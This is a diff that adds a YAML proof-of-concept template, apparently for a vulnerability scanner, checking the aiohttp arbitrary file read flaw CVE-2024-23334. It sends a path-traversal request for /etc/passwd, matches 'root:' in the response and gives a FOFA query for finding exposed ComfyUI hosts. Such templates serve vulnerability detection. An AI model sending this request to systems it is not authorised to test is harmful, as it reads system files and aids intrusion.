@@ -1,0 +1,16 @@
+id: poc-yaml-aiohttp-anyfile-read
+info:
+  name: aiohttp 任意文件读取漏洞(CVE-2024-23334)
+  severity: high
+  tags:
+  - CVE-2024-23334
+  - 两高一弱
+  finger: aiohttp
+  fofa: title=="ComfyUI"
+requests:
+- method: GET
+  path: /static/../../../../../etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<")
+variables: {}
+transport: http
